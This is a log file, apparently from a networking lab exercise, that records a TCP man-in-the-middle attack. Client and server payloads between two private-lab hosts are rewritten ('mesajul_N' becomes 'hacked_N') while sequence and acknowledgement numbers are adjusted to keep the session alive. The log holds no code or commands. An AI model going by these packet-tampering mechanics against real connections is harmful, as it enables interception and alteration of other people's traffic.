[LINE:261]# INFO     [2020-06-29 16:11:50,338]  [SERVER -- AFTER] seq_nr 1963746469:1963746499 , ack = 3748974671
[LINE:262]# INFO     [2020-06-29 16:11:50,338]  client_start_seq_nr_expected = 1963746499
[LINE:263]# INFO     [2020-06-29 16:11:50,338]  
[LINE:302]# INFO     [2020-06-29 16:11:50,339]  [After RAW Load]:  b"Server HACK mesajul: hacked_6'"
[LINE:303]# INFO     [2020-06-29 16:11:50,339]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:11:50,343]  
[LINE:77]# INFO     [2020-06-29 16:11:50,343]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:11:50,344]  
[LINE:268]# INFO     [2020-06-29 16:11:50,344]  
[LINE:269]# INFO     [2020-06-29 16:11:50,344]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:11:50,345]  Confirmare ack = 1963746499
[LINE:281]# INFO     [2020-06-29 16:11:50,345]  CLIENT flag A ==> ack = 1963746507
[LINE:303]# INFO     [2020-06-29 16:11:50,345]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:11:55,349]  
[LINE:77]# INFO     [2020-06-29 16:11:55,350]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:11:55,350]  
[LINE:80]# INFO     [2020-06-29 16:11:55,350]  [Before RAW Load]:  b'mesajul_7'
[LINE:99]# INFO     [2020-06-29 16:11:55,350]  
[LINE:100]# INFO     [2020-06-29 16:11:55,351]  [CLIENT -- BEFORE] seq_nr 3748974671:3748974680 , ack = 1963746499
[LINE:101]# INFO     [2020-06-29 16:11:55,351]  server_ack_nr_expected = 1963746507
[LINE:102]# INFO     [2020-06-29 16:11:55,351]  
[LINE:174]# INFO     [2020-06-29 16:11:55,351]  [CLIENT -- AFTER] seq_nr 3748974667:3748974676 , ack = 1963746507
[LINE:175]# INFO     [2020-06-29 16:11:55,351]  server_start_seq_nr_expected = 3748974676
[LINE:302]# INFO     [2020-06-29 16:11:55,352]  [After RAW Load]:  b"hacked_7'"
[LINE:303]# INFO     [2020-06-29 16:11:55,352]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:11:55,357]  
[LINE:77]# INFO     [2020-06-29 16:11:55,358]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:11:55,359]  
[LINE:80]# INFO     [2020-06-29 16:11:55,361]  [Before RAW Load]:  b"Server a primit mesajul: hacked_7'"
[LINE:184]# INFO     [2020-06-29 16:11:55,362]  
[LINE:185]# INFO     [2020-06-29 16:11:55,363]  [SERVER -- BEFORE] seq_nr 1963746507:1963746541 , ack = 3748974676
[LINE:186]# INFO     [2020-06-29 16:11:55,364]  client_ack_nr_expected = 3748974680
[LINE:187]# INFO     [2020-06-29 16:11:55,365]  
[LINE:260]# INFO     [2020-06-29 16:11:55,366]  
[LINE:261]# INFO     [2020-06-29 16:11:55,366]  [SERVER -- AFTER] seq_nr 1963746499:1963746533 , ack = 3748974680
[LINE:262]# INFO     [2020-06-29 16:11:55,367]  client_start_seq_nr_expected = 1963746533
[LINE:263]# INFO     [2020-06-29 16:11:55,368]  
[LINE:302]# INFO     [2020-06-29 16:11:55,368]  [After RAW Load]:  b"Server a primit mesajul: hacked_7'"
[LINE:303]# INFO     [2020-06-29 16:11:55,369]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:11:55,375]  
[LINE:77]# INFO     [2020-06-29 16:11:55,377]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:11:55,377]  
[LINE:268]# INFO     [2020-06-29 16:11:55,378]  
[LINE:269]# INFO     [2020-06-29 16:11:55,379]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:11:55,380]  Confirmare ack = 1963746533
[LINE:281]# INFO     [2020-06-29 16:11:55,381]  CLIENT flag A ==> ack = 1963746541
[LINE:303]# INFO     [2020-06-29 16:11:55,381]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:00,381]  
[LINE:77]# INFO     [2020-06-29 16:12:00,382]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:00,382]  
[LINE:80]# INFO     [2020-06-29 16:12:00,382]  [Before RAW Load]:  b'mesajul_8'
[LINE:99]# INFO     [2020-06-29 16:12:00,382]  
[LINE:100]# INFO     [2020-06-29 16:12:00,382]  [CLIENT -- BEFORE] seq_nr 3748974680:3748974689 , ack = 1963746533
[LINE:101]# INFO     [2020-06-29 16:12:00,383]  server_ack_nr_expected = 1963746541
[LINE:102]# INFO     [2020-06-29 16:12:00,383]  
[LINE:174]# INFO     [2020-06-29 16:12:00,383]  [CLIENT -- AFTER] seq_nr 3748974676:3748974681 , ack = 1963746541
[LINE:175]# INFO     [2020-06-29 16:12:00,384]  server_start_seq_nr_expected = 3748974681
[LINE:302]# INFO     [2020-06-29 16:12:00,384]  [After RAW Load]:  b"mH_8'"
[LINE:303]# INFO     [2020-06-29 16:12:00,384]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:00,389]  
[LINE:77]# INFO     [2020-06-29 16:12:00,390]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:00,390]  
[LINE:80]# INFO     [2020-06-29 16:12:00,390]  [Before RAW Load]:  b"Server a primit mesajul: mH_8'"
[LINE:184]# INFO     [2020-06-29 16:12:00,391]  
[LINE:185]# INFO     [2020-06-29 16:12:00,392]  [SERVER -- BEFORE] seq_nr 1963746541:1963746571 , ack = 3748974681
[LINE:186]# INFO     [2020-06-29 16:12:00,392]  client_ack_nr_expected = 3748974689
[LINE:187]# INFO     [2020-06-29 16:12:00,392]  
[LINE:260]# INFO     [2020-06-29 16:12:00,393]  
[LINE:261]# INFO     [2020-06-29 16:12:00,393]  [SERVER -- AFTER] seq_nr 1963746533:1963746559 , ack = 3748974689
[LINE:262]# INFO     [2020-06-29 16:12:00,394]  client_start_seq_nr_expected = 1963746559
[LINE:263]# INFO     [2020-06-29 16:12:00,394]  
[LINE:302]# INFO     [2020-06-29 16:12:00,395]  [After RAW Load]:  b"Server HACK mesajul: mH_8'"
[LINE:303]# INFO     [2020-06-29 16:12:00,395]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:00,399]  
[LINE:77]# INFO     [2020-06-29 16:12:00,400]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:12:00,400]  
[LINE:268]# INFO     [2020-06-29 16:12:00,400]  
[LINE:269]# INFO     [2020-06-29 16:12:00,401]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:12:00,402]  Confirmare ack = 1963746559
[LINE:281]# INFO     [2020-06-29 16:12:00,403]  CLIENT flag A ==> ack = 1963746571
[LINE:303]# INFO     [2020-06-29 16:12:00,403]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:05,406]  
[LINE:77]# INFO     [2020-06-29 16:12:05,406]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:05,406]  
[LINE:80]# INFO     [2020-06-29 16:12:05,407]  [Before RAW Load]:  b'mesajul_9'
[LINE:99]# INFO     [2020-06-29 16:12:05,407]  
[LINE:100]# INFO     [2020-06-29 16:12:05,407]  [CLIENT -- BEFORE] seq_nr 3748974689:3748974698 , ack = 1963746559
[LINE:101]# INFO     [2020-06-29 16:12:05,408]  server_ack_nr_expected = 1963746571
[LINE:102]# INFO     [2020-06-29 16:12:05,408]  
[LINE:174]# INFO     [2020-06-29 16:12:05,408]  [CLIENT -- AFTER] seq_nr 3748974681:3748974690 , ack = 1963746571
[LINE:175]# INFO     [2020-06-29 16:12:05,408]  server_start_seq_nr_expected = 3748974690
[LINE:302]# INFO     [2020-06-29 16:12:05,409]  [After RAW Load]:  b"hacked_9'"
[LINE:303]# INFO     [2020-06-29 16:12:05,409]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:05,415]  
[LINE:77]# INFO     [2020-06-29 16:12:05,416]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:05,416]  
[LINE:80]# INFO     [2020-06-29 16:12:05,417]  [Before RAW Load]:  b"Server a primit mesajul: hacked_9'"
[LINE:184]# INFO     [2020-06-29 16:12:05,418]  
[LINE:185]# INFO     [2020-06-29 16:12:05,419]  [SERVER -- BEFORE] seq_nr 1963746571:1963746605 , ack = 3748974690
[LINE:186]# INFO     [2020-06-29 16:12:05,419]  client_ack_nr_expected = 3748974698
[LINE:187]# INFO     [2020-06-29 16:12:05,420]  
[LINE:260]# INFO     [2020-06-29 16:12:05,421]  
[LINE:261]# INFO     [2020-06-29 16:12:05,421]  [SERVER -- AFTER] seq_nr 1963746559:1963746593 , ack = 3748974698
[LINE:262]# INFO     [2020-06-29 16:12:05,421]  client_start_seq_nr_expected = 1963746593
[LINE:263]# INFO     [2020-06-29 16:12:05,422]  
[LINE:302]# INFO     [2020-06-29 16:12:05,423]  [After RAW Load]:  b"Server a primit mesajul: hacked_9'"
[LINE:303]# INFO     [2020-06-29 16:12:05,423]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:05,430]  
[LINE:77]# INFO     [2020-06-29 16:12:05,431]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:12:05,431]  
[LINE:268]# INFO     [2020-06-29 16:12:05,432]  
[LINE:269]# INFO     [2020-06-29 16:12:05,433]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:12:05,433]  Confirmare ack = 1963746593
[LINE:281]# INFO     [2020-06-29 16:12:05,434]  CLIENT flag A ==> ack = 1963746605
[LINE:303]# INFO     [2020-06-29 16:12:05,435]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:10,435]  
[LINE:77]# INFO     [2020-06-29 16:12:10,435]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:10,435]  
[LINE:80]# INFO     [2020-06-29 16:12:10,436]  [Before RAW Load]:  b'mesajul_10'
[LINE:99]# INFO     [2020-06-29 16:12:10,436]  
[LINE:100]# INFO     [2020-06-29 16:12:10,436]  [CLIENT -- BEFORE] seq_nr 3748974698:3748974708 , ack = 1963746593
[LINE:101]# INFO     [2020-06-29 16:12:10,436]  server_ack_nr_expected = 1963746605
[LINE:102]# INFO     [2020-06-29 16:12:10,436]  
[LINE:174]# INFO     [2020-06-29 16:12:10,437]  [CLIENT -- AFTER] seq_nr 3748974690:3748974700 , ack = 1963746605
[LINE:175]# INFO     [2020-06-29 16:12:10,437]  server_start_seq_nr_expected = 3748974700
[LINE:302]# INFO     [2020-06-29 16:12:10,437]  [After RAW Load]:  b"hacked_10'"
[LINE:303]# INFO     [2020-06-29 16:12:10,437]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:10,440]  
[LINE:77]# INFO     [2020-06-29 16:12:10,440]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:10,440]  
[LINE:80]# INFO     [2020-06-29 16:12:10,441]  [Before RAW Load]:  b"Server a primit mesajul: hacked_10'"
[LINE:184]# INFO     [2020-06-29 16:12:10,441]  
[LINE:185]# INFO     [2020-06-29 16:12:10,441]  [SERVER -- BEFORE] seq_nr 1963746605:1963746640 , ack = 3748974700
[LINE:186]# INFO     [2020-06-29 16:12:10,441]  client_ack_nr_expected = 3748974708
[LINE:187]# INFO     [2020-06-29 16:12:10,441]  
[LINE:260]# INFO     [2020-06-29 16:12:10,442]  
[LINE:261]# INFO     [2020-06-29 16:12:10,442]  [SERVER -- AFTER] seq_nr 1963746593:1963746628 , ack = 3748974708
[LINE:262]# INFO     [2020-06-29 16:12:10,442]  client_start_seq_nr_expected = 1963746628
[LINE:263]# INFO     [2020-06-29 16:12:10,442]  
[LINE:302]# INFO     [2020-06-29 16:12:10,442]  [After RAW Load]:  b"Server a hacked mesajul: hacked_10'"
[LINE:303]# INFO     [2020-06-29 16:12:10,442]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:10,444]  
[LINE:77]# INFO     [2020-06-29 16:12:10,444]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:12:10,445]  
[LINE:268]# INFO     [2020-06-29 16:12:10,445]  
[LINE:269]# INFO     [2020-06-29 16:12:10,445]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:12:10,445]  Confirmare ack = 1963746628
[LINE:281]# INFO     [2020-06-29 16:12:10,445]  CLIENT flag A ==> ack = 1963746640
[LINE:303]# INFO     [2020-06-29 16:12:10,445]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:15,451]  
[LINE:77]# INFO     [2020-06-29 16:12:15,452]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:15,452]  
[LINE:80]# INFO     [2020-06-29 16:12:15,453]  [Before RAW Load]:  b'mesajul_11'
[LINE:99]# INFO     [2020-06-29 16:12:15,453]  
[LINE:100]# INFO     [2020-06-29 16:12:15,453]  [CLIENT -- BEFORE] seq_nr 3748974708:3748974718 , ack = 1963746628
[LINE:101]# INFO     [2020-06-29 16:12:15,453]  server_ack_nr_expected = 1963746640
[LINE:102]# INFO     [2020-06-29 16:12:15,454]  
[LINE:174]# INFO     [2020-06-29 16:12:15,454]  [CLIENT -- AFTER] seq_nr 3748974700:3748974710 , ack = 1963746640
[LINE:175]# INFO     [2020-06-29 16:12:15,455]  server_start_seq_nr_expected = 3748974710
[LINE:302]# INFO     [2020-06-29 16:12:15,455]  [After RAW Load]:  b"hacked_11'"
[LINE:303]# INFO     [2020-06-29 16:12:15,455]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:15,460]  
[LINE:77]# INFO     [2020-06-29 16:12:15,460]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:15,460]  
[LINE:80]# INFO     [2020-06-29 16:12:15,461]  [Before RAW Load]:  b"Server a primit mesajul: hacked_11'"
[LINE:184]# INFO     [2020-06-29 16:12:15,461]  
[LINE:185]# INFO     [2020-06-29 16:12:15,462]  [SERVER -- BEFORE] seq_nr 1963746640:1963746675 , ack = 3748974710
[LINE:186]# INFO     [2020-06-29 16:12:15,462]  client_ack_nr_expected = 3748974718
[LINE:187]# INFO     [2020-06-29 16:12:15,462]  
[LINE:260]# INFO     [2020-06-29 16:12:15,463]  
[LINE:261]# INFO     [2020-06-29 16:12:15,463]  [SERVER -- AFTER] seq_nr 1963746628:1963746663 , ack = 3748974718
[LINE:262]# INFO     [2020-06-29 16:12:15,463]  client_start_seq_nr_expected = 1963746663
[LINE:263]# INFO     [2020-06-29 16:12:15,463]  
[LINE:302]# INFO     [2020-06-29 16:12:15,464]  [After RAW Load]:  b"Server a hacked mesajul: hacked_11'"
[LINE:303]# INFO     [2020-06-29 16:12:15,464]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:15,466]  
[LINE:77]# INFO     [2020-06-29 16:12:15,467]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:12:15,467]  
[LINE:268]# INFO     [2020-06-29 16:12:15,467]  
[LINE:269]# INFO     [2020-06-29 16:12:15,467]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:12:15,467]  Confirmare ack = 1963746663
[LINE:281]# INFO     [2020-06-29 16:12:15,468]  CLIENT flag A ==> ack = 1963746675
[LINE:303]# INFO     [2020-06-29 16:12:15,468]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:20,475]  
[LINE:77]# INFO     [2020-06-29 16:12:20,476]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:20,476]  
[LINE:80]# INFO     [2020-06-29 16:12:20,476]  [Before RAW Load]:  b'mesajul_12'
[LINE:99]# INFO     [2020-06-29 16:12:20,477]  
[LINE:100]# INFO     [2020-06-29 16:12:20,477]  [CLIENT -- BEFORE] seq_nr 3748974718:3748974728 , ack = 1963746663
[LINE:101]# INFO     [2020-06-29 16:12:20,477]  server_ack_nr_expected = 1963746675
[LINE:102]# INFO     [2020-06-29 16:12:20,477]  
[LINE:174]# INFO     [2020-06-29 16:12:20,478]  [CLIENT -- AFTER] seq_nr 3748974710:3748974720 , ack = 1963746675
[LINE:175]# INFO     [2020-06-29 16:12:20,478]  server_start_seq_nr_expected = 3748974720
[LINE:302]# INFO     [2020-06-29 16:12:20,478]  [After RAW Load]:  b"hacked_12'"
[LINE:303]# INFO     [2020-06-29 16:12:20,479]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:20,483]  
[LINE:77]# INFO     [2020-06-29 16:12:20,484]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:20,484]  
[LINE:80]# INFO     [2020-06-29 16:12:20,484]  [Before RAW Load]:  b"Server a primit mesajul: hacked_12'"
[LINE:184]# INFO     [2020-06-29 16:12:20,485]  
[LINE:185]# INFO     [2020-06-29 16:12:20,485]  [SERVER -- BEFORE] seq_nr 1963746675:1963746710 , ack = 3748974720
[LINE:186]# INFO     [2020-06-29 16:12:20,485]  client_ack_nr_expected = 3748974728
[LINE:187]# INFO     [2020-06-29 16:12:20,486]  
[LINE:260]# INFO     [2020-06-29 16:12:20,486]  
[LINE:261]# INFO     [2020-06-29 16:12:20,487]  [SERVER -- AFTER] seq_nr 1963746663:1963746694 , ack = 3748974728
[LINE:262]# INFO     [2020-06-29 16:12:20,487]  client_start_seq_nr_expected = 1963746694
[LINE:263]# INFO     [2020-06-29 16:12:20,487]  
[LINE:302]# INFO     [2020-06-29 16:12:20,487]  [After RAW Load]:  b"Server HACK mesajul: hacked_12'"
[LINE:303]# INFO     [2020-06-29 16:12:20,487]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:20,491]  
[LINE:77]# INFO     [2020-06-29 16:12:20,492]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:12:20,492]  
[LINE:268]# INFO     [2020-06-29 16:12:20,492]  
[LINE:269]# INFO     [2020-06-29 16:12:20,493]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:12:20,493]  Confirmare ack = 1963746694
[LINE:281]# INFO     [2020-06-29 16:12:20,493]  CLIENT flag A ==> ack = 1963746710
[LINE:303]# INFO     [2020-06-29 16:12:20,494]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:25,493]  
[LINE:77]# INFO     [2020-06-29 16:12:25,494]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:25,494]  
[LINE:80]# INFO     [2020-06-29 16:12:25,495]  [Before RAW Load]:  b'mesajul_13'
[LINE:99]# INFO     [2020-06-29 16:12:25,495]  
[LINE:100]# INFO     [2020-06-29 16:12:25,495]  [CLIENT -- BEFORE] seq_nr 3748974728:3748974738 , ack = 1963746694
[LINE:101]# INFO     [2020-06-29 16:12:25,495]  server_ack_nr_expected = 1963746710
[LINE:102]# INFO     [2020-06-29 16:12:25,496]  
[LINE:174]# INFO     [2020-06-29 16:12:25,496]  [CLIENT -- AFTER] seq_nr 3748974720:3748974730 , ack = 1963746710
[LINE:175]# INFO     [2020-06-29 16:12:25,496]  server_start_seq_nr_expected = 3748974730
[LINE:302]# INFO     [2020-06-29 16:12:25,497]  [After RAW Load]:  b"hacked_13'"
[LINE:303]# INFO     [2020-06-29 16:12:25,497]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:25,501]  
[LINE:77]# INFO     [2020-06-29 16:12:25,502]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:25,502]  
[LINE:80]# INFO     [2020-06-29 16:12:25,502]  [Before RAW Load]:  b"Server a primit mesajul: hacked_13'"
[LINE:184]# INFO     [2020-06-29 16:12:25,503]  
[LINE:185]# INFO     [2020-06-29 16:12:25,503]  [SERVER -- BEFORE] seq_nr 1963746710:1963746745 , ack = 3748974730
[LINE:186]# INFO     [2020-06-29 16:12:25,505]  client_ack_nr_expected = 3748974738
[LINE:187]# INFO     [2020-06-29 16:12:25,505]  
[LINE:260]# INFO     [2020-06-29 16:12:25,506]  
[LINE:261]# INFO     [2020-06-29 16:12:25,506]  [SERVER -- AFTER] seq_nr 1963746694:1963746729 , ack = 3748974738
[LINE:262]# INFO     [2020-06-29 16:12:25,506]  client_start_seq_nr_expected = 1963746729
[LINE:263]# INFO     [2020-06-29 16:12:25,506]  
[LINE:302]# INFO     [2020-06-29 16:12:25,507]  [After RAW Load]:  b"Server a hacked mesajul: hacked_13'"
[LINE:303]# INFO     [2020-06-29 16:12:25,507]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:25,510]  
[LINE:77]# INFO     [2020-06-29 16:12:25,511]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:12:25,511]  
[LINE:268]# INFO     [2020-06-29 16:12:25,511]  
[LINE:269]# INFO     [2020-06-29 16:12:25,511]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:12:25,512]  Confirmare ack = 1963746729
[LINE:281]# INFO     [2020-06-29 16:12:25,512]  CLIENT flag A ==> ack = 1963746745
[LINE:303]# INFO     [2020-06-29 16:12:25,512]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:30,518]  
[LINE:77]# INFO     [2020-06-29 16:12:30,518]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:30,519]  
[LINE:80]# INFO     [2020-06-29 16:12:30,519]  [Before RAW Load]:  b'mesajul_14'
[LINE:99]# INFO     [2020-06-29 16:12:30,519]  
[LINE:100]# INFO     [2020-06-29 16:12:30,520]  [CLIENT -- BEFORE] seq_nr 3748974738:3748974748 , ack = 1963746729
[LINE:101]# INFO     [2020-06-29 16:12:30,520]  server_ack_nr_expected = 1963746745
[LINE:102]# INFO     [2020-06-29 16:12:30,520]  
[LINE:174]# INFO     [2020-06-29 16:12:30,521]  [CLIENT -- AFTER] seq_nr 3748974730:3748974736 , ack = 1963746745
[LINE:175]# INFO     [2020-06-29 16:12:30,521]  server_start_seq_nr_expected = 3748974736
[LINE:302]# INFO     [2020-06-29 16:12:30,521]  [After RAW Load]:  b"mH_14'"
[LINE:303]# INFO     [2020-06-29 16:12:30,521]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:30,526]  
[LINE:77]# INFO     [2020-06-29 16:12:30,527]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:30,527]  
[LINE:80]# INFO     [2020-06-29 16:12:30,527]  [Before RAW Load]:  b"Server a primit mesajul: mH_14'"
[LINE:184]# INFO     [2020-06-29 16:12:30,527]  
[LINE:185]# INFO     [2020-06-29 16:12:30,528]  [SERVER -- BEFORE] seq_nr 1963746745:1963746776 , ack = 3748974736
[LINE:186]# INFO     [2020-06-29 16:12:30,528]  client_ack_nr_expected = 3748974748
[LINE:187]# INFO     [2020-06-29 16:12:30,528]  
[LINE:260]# INFO     [2020-06-29 16:12:30,529]  
[LINE:261]# INFO     [2020-06-29 16:12:30,530]  [SERVER -- AFTER] seq_nr 1963746729:1963746756 , ack = 3748974748
[LINE:262]# INFO     [2020-06-29 16:12:30,530]  client_start_seq_nr_expected = 1963746756
[LINE:263]# INFO     [2020-06-29 16:12:30,530]  
[LINE:302]# INFO     [2020-06-29 16:12:30,530]  [After RAW Load]:  b"Server HACK mesajul: mH_14'"
[LINE:303]# INFO     [2020-06-29 16:12:30,530]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:30,534]  
[LINE:77]# INFO     [2020-06-29 16:12:30,535]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:12:30,535]  
[LINE:268]# INFO     [2020-06-29 16:12:30,535]  
[LINE:269]# INFO     [2020-06-29 16:12:30,536]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:12:30,536]  Confirmare ack = 1963746756
[LINE:281]# INFO     [2020-06-29 16:12:30,536]  CLIENT flag A ==> ack = 1963746776
[LINE:303]# INFO     [2020-06-29 16:12:30,537]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:35,541]  
[LINE:77]# INFO     [2020-06-29 16:12:35,542]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:35,542]  
[LINE:80]# INFO     [2020-06-29 16:12:35,543]  [Before RAW Load]:  b'mesajul_15'
[LINE:99]# INFO     [2020-06-29 16:12:35,543]  
[LINE:100]# INFO     [2020-06-29 16:12:35,544]  [CLIENT -- BEFORE] seq_nr 3748974748:3748974758 , ack = 1963746756
[LINE:101]# INFO     [2020-06-29 16:12:35,544]  server_ack_nr_expected = 1963746776
[LINE:102]# INFO     [2020-06-29 16:12:35,544]  
[LINE:174]# INFO     [2020-06-29 16:12:35,545]  [CLIENT -- AFTER] seq_nr 3748974736:3748974746 , ack = 1963746776
[LINE:175]# INFO     [2020-06-29 16:12:35,545]  server_start_seq_nr_expected = 3748974746
[LINE:302]# INFO     [2020-06-29 16:12:35,546]  [After RAW Load]:  b'mesajul_15'
[LINE:303]# INFO     [2020-06-29 16:12:35,546]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:35,551]  
[LINE:77]# INFO     [2020-06-29 16:12:35,552]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:35,552]  
[LINE:80]# INFO     [2020-06-29 16:12:35,552]  [Before RAW Load]:  b'Server a primit mesajul: mesajul_15'
[LINE:184]# INFO     [2020-06-29 16:12:35,553]  
[LINE:185]# INFO     [2020-06-29 16:12:35,553]  [SERVER -- BEFORE] seq_nr 1963746776:1963746811 , ack = 3748974746
[LINE:186]# INFO     [2020-06-29 16:12:35,553]  client_ack_nr_expected = 3748974758
[LINE:187]# INFO     [2020-06-29 16:12:35,553]  
[LINE:260]# INFO     [2020-06-29 16:12:35,554]  
[LINE:261]# INFO     [2020-06-29 16:12:35,554]  [SERVER -- AFTER] seq_nr 1963746756:1963746791 , ack = 3748974758
[LINE:262]# INFO     [2020-06-29 16:12:35,555]  client_start_seq_nr_expected = 1963746791
[LINE:263]# INFO     [2020-06-29 16:12:35,555]  
[LINE:302]# INFO     [2020-06-29 16:12:35,556]  [After RAW Load]:  b'Server a primit mesajul: mesajul_15'
[LINE:303]# INFO     [2020-06-29 16:12:35,556]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:35,560]  
[LINE:77]# INFO     [2020-06-29 16:12:35,561]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:12:35,561]  
[LINE:268]# INFO     [2020-06-29 16:12:35,562]  
[LINE:269]# INFO     [2020-06-29 16:12:35,562]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:12:35,562]  Confirmare ack = 1963746791
[LINE:281]# INFO     [2020-06-29 16:12:35,563]  CLIENT flag A ==> ack = 1963746811
[LINE:303]# INFO     [2020-06-29 16:12:35,563]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:40,566]  
[LINE:77]# INFO     [2020-06-29 16:12:40,567]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:40,567]  
[LINE:80]# INFO     [2020-06-29 16:12:40,567]  [Before RAW Load]:  b'mesajul_16'
[LINE:99]# INFO     [2020-06-29 16:12:40,568]  
[LINE:100]# INFO     [2020-06-29 16:12:40,568]  [CLIENT -- BEFORE] seq_nr 3748974758:3748974768 , ack = 1963746791
[LINE:101]# INFO     [2020-06-29 16:12:40,568]  server_ack_nr_expected = 1963746811
[LINE:102]# INFO     [2020-06-29 16:12:40,568]  
[LINE:174]# INFO     [2020-06-29 16:12:40,569]  [CLIENT -- AFTER] seq_nr 3748974746:3748974756 , ack = 1963746811
[LINE:175]# INFO     [2020-06-29 16:12:40,569]  server_start_seq_nr_expected = 3748974756
[LINE:302]# INFO     [2020-06-29 16:12:40,570]  [After RAW Load]:  b"hacked_16'"
[LINE:303]# INFO     [2020-06-29 16:12:40,570]  ----------------------------------------
